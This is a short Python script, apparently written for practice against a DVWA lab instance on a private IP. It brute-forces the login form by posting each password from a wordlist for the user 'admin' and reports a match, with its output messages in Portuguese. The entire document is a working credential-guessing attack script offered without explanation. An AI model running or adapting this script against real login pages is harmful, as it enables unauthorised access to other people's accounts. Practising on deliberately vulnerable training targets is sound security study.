import requests

url = "http://192.168.56.102/dvwa/login.php"
username = "admin"
wordlist = "wordlist.txt"

with open(wordlist, "r") as f:
    for password in f:
        password = password.strip()
        payload = {
            "username": username,
            "password": password,
            "Login": "Login"
        }
        session = requests.Session()
        response = session.post(url, data=payload)

        if "Login failed" not in response.text:
            print(f"[+] Senha encontrada: {password}")
            break
        else:
            print(f"[-] Tentativa com: {password}")